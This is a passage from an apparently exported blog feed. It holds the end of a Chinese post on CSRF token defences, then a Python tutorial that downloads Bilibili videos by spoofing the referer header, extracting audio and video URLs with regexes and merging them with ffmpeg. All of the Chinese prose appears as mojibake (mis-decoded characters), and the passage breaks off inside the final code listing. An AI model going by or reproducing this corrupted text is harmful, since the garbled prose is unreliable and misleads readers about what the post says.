ä¸€ä¸ªå¸¦æœ‰åˆæ³•Tokençš„è¯·æ±‚å®æ–½CSRFæ”»å‡»ã€‚å¦å¤–ä½¿ç”¨Tokenæ—¶åº”æ³¨æ„Tokençš„ä¿å¯†æ€§ï¼Œå°½é‡æŠŠæ•æ„Ÿæ“ä½œç”±GETæ”¹ä¸ºPOSTï¼Œä»¥formæˆ–AJAXå½¢å¼æäº¤ï¼Œé¿å…Tokenæ³„éœ²ã€‚</p><blockquote><p>CSRFçš„Tokenä»…ä»…é€‚ç”¨äºå¯¹æŠ—CSRFæ”»å‡»ã€‚å½“ç½‘ç«™åŒæ—¶å­˜åœ¨XSSæ¼æ´æ—¶å€™ï¼Œé‚£è¿™ä¸ªæ–¹æ¡ˆä¹Ÿæ˜¯ç©ºè°ˆã€‚å› ä¸ºæ”»å‡»è€…å¯ä»¥é€šè¿‡jsè·å–Tokenå€¼ã€‚</p></blockquote><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://blog.csdn.net/weixin_44940180/article/details/107140456">Pikachuä¹‹CSRF</a></p><p>[2] <a href="https://blog.csdn.net/m0_37732829/article/details/90513122?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">Webå®‰å…¨ä¹‹CSRFæ”»å‡»</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨ </tag>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonçˆ¬è™«è½»æ¾æå®šBç«™è§†é¢‘ä¸‹è½½</title>
      <link href="posts/3575.html"/>
      <url>posts/3575.html</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼ˆä¸ä½¿ç”¨å…¶ä»–å·¥å…·æˆ–æ’ä»¶ï¼‰ï¼ŒWebç«¯çš„bilibiliä¼¼ä¹æ— æ³•ï¼ˆå½»åº•ç™½å«–ï¼‰ä¸‹è½½è§†é¢‘ï¼Œé‚å­¦ä¹ äº†å¦‚ä½•åˆ©ç”¨Pythonçˆ¬è™«ä¸‹è½½bç«™è§†é¢‘ï¼ˆä¸åŒ…æ‹¬ä¼šå‘˜è§†é¢‘ï¼‰ï¼Œè¯¦æƒ…ï¼ˆæ‰‹æ³•ï¼‰ä¸”çœ‹ä¸‹æ–‡ã€‚</p><blockquote><p>å‚è€ƒè§†é¢‘ï¼š<a href="https://www.bilibili.com/video/BV1Fy4y1D7XS">https://www.bilibili.com/video/BV1Fy4y1D7XS</a></p><p>åœ¨åˆ†æbç«™ç½‘é¡µæºä»£ç çš„è¿‡ç¨‹ä¸­å‘ç°å…¶è§†é¢‘å’ŒéŸ³é¢‘æ˜¯åˆ†å¼€çš„ï¼Œä¸‹è½½åä¸€ä¸ªåªæœ‰å£°éŸ³ï¼Œä¸€ä¸ªåªæœ‰ç”»é¢ï¼Œè¿™æ˜¾ç„¶ä¸èƒ½æ»¡è¶³æˆ‘ä»¬çš„è¦æ±‚ã€‚è§£å†³æ–¹æ¡ˆæ˜¯ï¼šåˆ©ç”¨ <a href="http://www.ffmpeg.org/download.html">ffmpeg</a> è¿™æ¬¾å¼ºå¤§çš„å¼€æºå·¥å…·æŠŠä¸‹è½½åçš„éŸ³è§†é¢‘è¿›è¡Œåˆå¹¶ã€‚æ•…æƒ³è¦å®Œç¾ä½“éªŒï¼Œå…ˆå¾—ä¸‹è½½å®‰è£…å¹¶é…ç½®å¥½ <code>ffmpeg</code> ã€‚ï¼ˆåˆ°å®˜ç½‘ä¸‹è½½ï¼Œè§£å‹åæŠŠæ–‡ä»¶å¤¹å†…çš„<code>bin</code> æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ï¼‰</p><p>Pythonä¸­ä½¿ç”¨åˆ°çš„æ¨¡å—æœ‰ï¼š<code>requests</code>ã€<code>re</code>ã€<code>json</code>ã€<code>subprocess</code>ã€<code>os</code></p></blockquote><h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><p>è§†é¢‘çš„<code>url</code>æ¯”è¾ƒæ˜¾çœ¼ï¼Œå®¹æ˜“è·å–ã€‚<code>headers</code>ä¹Ÿå¥½æ‰¾ï¼Œä½†è¿˜éœ€è¦ä¸€é‡è¦ä¿¡æ¯ã€‚</p><p>é€šè¿‡æµè§ˆå™¨ï¼ˆF12ï¼‰æŸ¥çœ‹åˆ†æç›®æ ‡ç½‘é¡µï¼Œæ‰¾åˆ°æˆ‘ä»¬çš„ä¸‹ä¸€ç›®æ ‡ï¼Œå³è§†ï¼ˆéŸ³ï¼‰é¢‘ä¸‹è½½é“¾æ¥ã€‚</p><p>ä¸€ç•ªæŸ¥æ‰¾åï¼Œå‘ç°åœ¨<code>head</code>é‡Œçš„ç¬¬å››ä¸ª<code>script</code> æ ‡ç­¾å†…ä¼¼ä¹æœ‰æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210321234819818.png" alt="image-20210321234819818"></p><p>å¯è®¿é—®æ­¤é“¾æ¥ï¼Œå´å‡ºç°403ï¼Œå³æ²¡æœ‰æƒé™è®¿é—®æ­¤ç«™ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210321235102571.png" alt="image-20210321235102571"></p><p>è¿™åˆæ€ä¹ˆå›äº‹ï¼ŸæŸ¥çœ‹Request Headers ä¿¡æ¯ï¼Œå‘ç°æ²¡æœ‰refererè¿™ä¸€é¡¹ï¼Œäºæ˜¯å°è¯•åœ¨æ•°æ®åŒ…ä¸­åŠ ä¸Šrefererä¿¡æ¯çœ‹èƒ½å¦è®¿é—®ã€‚ï¼ˆè¿™é‡Œç›´æ¥ä¸Šbpäº†ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210321235900739.png" alt="image-20210321235900739"></p><p>Forwardåï¼Œå‡ºç°æ–‡ä»¶ä¸‹è½½é¡µé¢ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322000022154.png" alt="image-20210322000022154"></p><p>ä¸‹è½½åæ‰“å¼€æ”¹æ–‡ä»¶ï¼Œç¡®ä¸ºç›®æ ‡è§†é¢‘ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322000250594.png" alt="image-20210322000250594"></p><h1 id="è·å–æ•°æ®"><a href="#è·å–æ•°æ®" class="headerlink" title="è·å–æ•°æ®"></a>è·å–æ•°æ®</h1><p>é€šè¿‡requestsåº“å‘ç›®æ ‡ç«™ç‚¹å‘èµ·è¯·æ±‚ï¼Œè¯·æ±‚éœ€åŒ…å«headerã€refererç­‰ä¿¡æ¯ï¼Œä»¥ä¼ªè£…æˆæ˜¯æµè§ˆå™¨å‘å‡ºè¯·æ±‚ã€‚å¦‚æœæœåŠ¡å™¨èƒ½æ­£å¸¸å“åº”ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªResponseï¼Œä¾¿æ˜¯æ‰€è¦è·å–çš„é¡µé¢å†…å®¹ã€‚</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers) <span class="comment">#å‘é€getè¯·æ±‚ï¼Œè·å¾—å“åº”</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">print(html_data)</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322002017006.png" alt="image-20210322002017006"></p><h1 id="è§£æå†…å®¹"><a href="#è§£æå†…å®¹" class="headerlink" title="è§£æå†…å®¹"></a>è§£æå†…å®¹</h1><p>å¾—åˆ°çš„å†…å®¹å¯èƒ½æ˜¯HTMLã€jsonç­‰æ ¼å¼ï¼Œå¯ä»¥ç”¨é¡µé¢è§£æåº“ã€æ­£åˆ™è¡¨è¾¾å¼ç­‰è¿›è¡Œè§£æã€‚</p><p><strong>title</strong>ä¿¡æ¯æ¯”è¾ƒå¥½æ‰¾ï¼Œå°±åœ¨headä¸­ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322003021075.png" alt="image-20210322003021075"></p><p>åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹å…¶è¿›è¡Œæå–ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>éŸ³è§†é¢‘ä¸‹è½½é“¾æ¥</strong>åœ¨jsonæ•°æ®ä¸­ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322003718230.png" alt="image-20210322003718230"></p><p>åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼å’Œå­—å…¸ï¼ˆåˆ—è¡¨ï¼‰çš„â€œé”®â€å¯¹å…¶æå–ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">json_data &#x3D; re.findall(r&#39;&lt;script&gt;window.__playinfo__&#x3D;(.*?)&lt;&#x2F;script&gt;&#39;,html_data)[0]</span><br><span class="line">    json_data &#x3D; json.loads(json_data) #è§£ç  JSON æ•°æ®ï¼Œè¿”å› Python å­—æ®µçš„æ•°æ®ç±»å‹ã€‚</span><br><span class="line">    audio_url &#x3D; json_data[&quot;data&quot;][&quot;dash&quot;][&quot;audio&quot;][0][&quot;backupUrl&quot;][0]</span><br><span class="line">    video_url &#x3D; json_data[&quot;data&quot;][&quot;dash&quot;][&quot;video&quot;][0][&quot;backupUrl&quot;][0]</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    <span class="comment">#pprint.pprint(json_data)</span></span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">video_data = get_video_data(html_data)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> video_data:</span><br><span class="line">    print(item)</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322004738048.png" alt="image-20210322004738048"></p><h1 id="ä¿å­˜æ•°æ®"><a href="#ä¿å­˜æ•°æ®" class="headerlink" title="ä¿å­˜æ•°æ®"></a>ä¿å­˜æ•°æ®</h1><p>é€šè¿‡ä¸‹è½½é“¾æ¥ï¼Œå°†éŸ³è§†é¢‘ä¸‹è½½åˆ°æœ¬åœ°å¹¶ä¿å­˜ã€‚</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘ï¼&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘ï¼&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">video_data = get_video_data(html_data)</span><br><span class="line">save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010005615.png" alt="image-20210322010005615"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010033745.png" alt="image-20210322010033745"></p><h1 id="åˆå¹¶éŸ³è§†é¢‘"><a href="#åˆå¹¶éŸ³è§†é¢‘" class="headerlink" title="åˆå¹¶éŸ³è§†é¢‘"></a>åˆå¹¶éŸ³è§†é¢‘</h1><p>æŠŠåˆ†å¼€çš„éŸ³é¢‘å’Œè§†é¢‘è¿›è¡Œåˆå¹¶ã€‚ï¼ˆå‡ æ¬¡æµ‹è¯•ä¸‹æ¥ï¼Œå‘ç°å¦‚æœç”¨è§†é¢‘æ ‡é¢˜ä½œä¸ºæ–‡ä»¶åå»æ‰§è¡Œffmpegå‘½ä»¤ä¼šå¯¼è‡´å…¶å‡ºç°é”™è¯¯ï¼Œæš‚æ—¶æ²¡æ‰¾åˆ°è§£å†³æ–¹æ³•ï¼Œåæ¥è¯•ç€å°†æ–‡ä»¶åå…ˆé‡å‘½åä¸º1.mp3ã€1.mp4è¿™ç§ç®€å•çš„åå­—ï¼Œå¯ä»¥å®Œæˆåˆå¹¶ï¼Œå†åˆ é™¤ä¹‹)</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36&quot;</span>,<span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://message.bilibili.com/&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_request</span>(<span class="params">url</span>):</span></span><br><span class="line">    response = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_video_data</span>(<span class="params">html_data</span>):</span></span><br><span class="line">    title = re.findall(<span class="string">&#x27;&lt;title data-vue-meta=&quot;true&quot;&gt;(.*?)&lt;/title&gt;&#x27;</span>,html_data)[<span class="number">0</span>].replace(<span class="string">&quot;_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    json_data = re.findall(<span class="string">r&#x27;&lt;script&gt;window.__playinfo__=(.*?)&lt;/script&gt;&#x27;</span>,html_data)[<span class="number">0</span>]</span><br><span class="line">    json_data = json.loads(json_data)</span><br><span class="line">    audio_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;audio&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_url = json_data[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;dash&quot;</span>][<span class="string">&quot;video&quot;</span>][<span class="number">0</span>][<span class="string">&quot;backupUrl&quot;</span>][<span class="number">0</span>]</span><br><span class="line">    video_data = [title, audio_url, video_url]</span><br><span class="line">    <span class="keyword">return</span> video_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span>(<span class="params">file_name,audio_url,video_url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘...&quot;</span>)</span><br><span class="line">    audio_data = send_request(audio_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„éŸ³é¢‘ï¼&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨ä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘...&quot;</span>)</span><br><span class="line">    video_data = send_request(video_url).content</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆä¸‹è½½ &quot;</span> + file_name + <span class="string">&quot;çš„è§†é¢‘ï¼&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp3&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(audio_data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name + <span class="string">&quot;.mp4&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(video_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_data</span>(<span class="params">video_name</span>):</span></span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp3&quot;</span>,<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.rename(video_name + <span class="string">&quot;.mp4&quot;</span>,<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;æ­£åœ¨åˆå¹¶ &quot;</span> + video_name + <span class="string">&quot;çš„è§†é¢‘...&quot;</span>)</span><br><span class="line">    subprocess.call(<span class="string">&quot;ffmpeg -i 1.mp4 -i 1.mp3 -c:v copy -c:a aac -strict experimental output.mp4&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">    os.rename(<span class="string">&quot;output.mp4&quot;</span>, video_name + <span class="string">&quot;.mp4&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp3&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;1.mp4&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;å®Œæˆåˆå¹¶ &quot;</span> + video_name + <span class="string">&quot;çš„è§†é¢‘ï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line">html_data = send_request(<span class="string">&quot;https://www.bilibili.com/video/BV1Qy4y147H1&quot;</span>).text</span><br><span class="line">video_data = get_video_data(html_data)</span><br><span class="line">save_data(video_data[<span class="number">0</span>],video_data[<span class="number">1</span>],video_data[<span class="number">2</span>])</span><br><span class="line">merge_data(video_data[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010405722.png" alt="image-20210322010405722"></p><p>åˆå¹¶åè§†é¢‘æ­£å¸¸æ’­æ”¾ï¼Œæœ‰å£°æœ‰è‰²ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210322010551889.png" alt="image-20210322010551889"></p><h1 id="æœ€ç»ˆä»£ç "><a href="#æœ€ç»ˆä»£ç " class="headerlink" title="æœ€ç»ˆä»£ç "></a>æœ€ç»ˆä»£ç </h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 